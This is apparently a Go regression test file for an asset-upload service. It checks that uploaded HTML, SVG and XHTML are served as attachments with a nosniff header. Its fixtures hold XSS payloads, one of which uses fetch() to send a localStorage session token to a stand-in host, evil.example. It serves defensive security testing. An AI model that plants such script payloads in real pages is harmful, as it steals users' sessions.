package handler

import (
	"encoding/json"
	"net/http"
	"strings"
	"testing"
)

// initiateWithMime 与 harness.initiate 同一入口，额外带上调用方声明的 mime_type
// （审计 S-3 的攻击面就是"声明什么类型就按什么类型下发"）。
func (h *uploadHarness) initiateWithMime(t *testing.T, token, name, sha string, size int64, mimeType string) string {
	t.Helper()
	in := map[string]any{"file_name": name, "file_size": size, "sha256_hash": sha, "part_count": 1, "mime_type": mimeType}
	body, _ := json.Marshal(in)
	code, resp := h.do(token, http.MethodPost, "/api/storage/upload/initiate", string(body))
	if code != 200 {
		t.Fatalf("initiate 返回 %d（请求 %s / 响应 %s）", code, body, resp)
	}
	var out struct {
		AssetID string `json:"asset_id"`
	}
	if err := json.Unmarshal([]byte(resp), &out); err != nil {
		t.Fatalf("解析 initiate 响应失败: %v（%s）", err, resp)
	}
	if out.AssetID == "" {
		t.Fatalf("initiate 没有返回 asset_id: %s", resp)
	}
	return out.AssetID
}

// 上传一份声明类型为 text/html 的内容并绑到可见实体，返回资产 id 与原始字节。
func (h *uploadHarness) uploadBound(t *testing.T, token, name, mimeType string, body []byte) string {
	t.Helper()
	sha := sha256HexOf(body)
	assetID := h.initiateWithMime(t, token, name, sha, int64(len(body)), mimeType)
	if code, resp := h.put(t, token, assetID, body); code != 200 {
		t.Fatalf("上传返回 %d（%s）", code, resp)
	}
	h.bind(t, token, assetID, "01a0a88d-cd52-745a-9266-b62aea6f8296")
	return assetID
}

// 审计 S-3 的完整链路：持 storage.asset.upload 的普通成员声明 mime_type=text/html 上传内容、
// 绑到可见实体，再把 /assets/{id}/content 发给任何人。这条响应与主站同源，一旦按声明类型内联
// 渲染，脚本就在主站上下文里执行、读走 localStorage 里的令牌（S-6）。
// 断言：匿名打开拿到的是**附件**，并且带 nosniff。去掉白名单（回到恒 inline）本用例必失败。
func TestAssetContentNeverInlinesDeclaredHTML(t *testing.T) {
	h := newUploadHarness(t, false)
	owner := h.token("11111111-1111-1111-1111-111111111111")
	body := []byte("<script>fetch(\"//evil.example/\"+localStorage.metafusion_token)</script>")
	assetID := h.uploadBound(t, owner, "note.html", "text/html", body)

	w := h.getContent("", assetID)
	if w.Code != 200 {
		t.Fatalf("绑定到可见实体后匿名应 200，实际 %d（%s）", w.Code, w.Body.String())
	}
	if cd := w.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
		t.Fatalf("Content-Disposition = %q，期望 attachment（HTML 绝不能内联下发）", cd)
	}
	if n := w.Header().Get("X-Content-Type-Options"); n != "nosniff" {
		t.Fatalf("X-Content-Type-Options = %q，期望 nosniff", n)
	}
	// 附件分支保留真实类型，便于下载后系统识别；收口靠 disposition + nosniff。
	if ct := w.Header().Get("Content-Type"); ct != "text/html" {
		t.Fatalf("Content-Type = %q，期望保留登记的真实类型 text/html", ct)
	}
}

// SVG 与 XHTML 同理：它们是图片/文档，但都能带脚本。
func TestAssetContentNeverInlinesSVGOrXHTML(t *testing.T) {
	h := newUploadHarness(t, false)
	owner := h.token("11111111-1111-1111-1111-111111111111")
	for _, tc := range []struct{ name, mime string }{
		{"icon.svg", "image/svg+xml"},
		{"page.xhtml", "application/xhtml+xml"},
	} {
		assetID := h.uploadBound(t, owner, tc.name, tc.mime, []byte("<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"))
		w := h.getContent("", assetID)
		if w.Code != 200 {
			t.Fatalf("%s: 匿名应 200，实际 %d", tc.mime, w.Code)
		}
		if cd := w.Header().Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
			t.Errorf("%s: Content-Disposition = %q，期望 attachment", tc.mime, cd)
		}
	}
}

// 声明值与内容不符（mime_type=image/png、内容其实是 HTML）：首发路径拿不到真类型，
// 此时唯一的防线是不许浏览器嗅探。去掉 nosniff 这条用例会失败。
func TestAssetContentKeepsNosniffAgainstDeclaredTypeMismatch(t *testing.T) {
	h := newUploadHarness(t, false)
	owner := h.token("11111111-1111-1111-1111-111111111111")
	body := []byte("<html><body><script>alert(document.domain)</script></body></html>")
	assetID := h.uploadBound(t, owner, "cover.png", "image/png", body)

	w := h.getContent("", assetID)
	if w.Code != 200 {
		t.Fatalf("匿名应 200，实际 %d（%s）", w.Code, w.Body.String())
	}
	if n := w.Header().Get("X-Content-Type-Options"); n != "nosniff" {
		t.Fatalf("X-Content-Type-Options = %q，期望 nosniff（声明类型是位图但内容是 HTML）", n)
	}
}

// 反向对照：白名单内的位图仍然内联——展示用途不能被这轮收紧一起打死。
func TestAssetContentInlinesDeclaredRasterImage(t *testing.T) {
	h := newUploadHarness(t, false)
	owner := h.token("11111111-1111-1111-1111-111111111111")
	body := onePixelPNGBytes(t)
	assetID := h.uploadBound(t, owner, "cover.png", "image/png", body)

	w := h.getContent("", assetID)
	if w.Code != 200 {
		t.Fatalf("匿名应 200，实际 %d（%s）", w.Code, w.Body.String())
	}
	if cd := w.Header().Get("Content-Disposition"); cd != "inline" {
		t.Fatalf("Content-Disposition = %q，期望 inline（位图属于展示用途）", cd)
	}
	if ct := w.Header().Get("Content-Type"); ct != "image/png" {
		t.Fatalf("Content-Type = %q，期望 image/png", ct)
	}
}
